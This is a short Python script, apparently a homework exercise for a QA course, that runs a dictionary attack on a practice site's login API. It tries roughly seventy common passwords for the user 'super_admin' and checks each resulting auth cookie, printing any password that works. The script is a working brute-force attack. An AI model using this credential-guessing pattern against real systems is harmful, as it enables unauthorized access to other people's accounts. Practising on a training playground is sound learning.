import requests

passwords = ["password", "123456", "123456789", "12345678", "12345", "123456789", "qwerty", "abc123",
             "football", "1234567", "monkey", "111111", "letmein", "1234", "1234567890",
             "dragon", "baseball", "sunshine", "1q2w3e4r",
             "iloveyou", "princess", "adobe123", "welcome", "login", "admin", "trustno1", "solo", "q2w3e4r",
             "master", "sunshine", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "123123", "mustang",
             "121212", "starwars", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely",
             "654321", "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie",
             "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme",
             "whatever", "donald", "trustno1", "zaq1zaq1", "Football", "000000", "starwars", "qwerty123", "123qwe"
             ]

for i in passwords:
    payload = {"login": "super_admin", "password": i}
    get_cookies = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

    auth_cookie = dict(get_cookies.cookies)

    check_cookies = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=auth_cookie)

    if check_cookies.text != "You are NOT authorized":
        print(payload.get("password"))
        print(check_cookies.text)